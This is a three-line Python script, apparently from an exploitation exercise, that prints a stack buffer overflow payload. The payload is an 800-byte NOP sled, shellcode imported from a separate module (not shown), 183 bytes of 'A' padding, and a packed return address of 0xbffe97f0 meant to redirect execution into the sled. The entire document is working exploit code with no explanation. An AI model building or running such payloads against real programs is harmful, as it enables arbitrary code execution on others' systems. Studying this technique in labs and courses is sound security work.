from struct import pack
from shellcode import shellcode
print('\x90'*800 + shellcode + 'A'*183 + pack('<I', 0xbffe97f0))
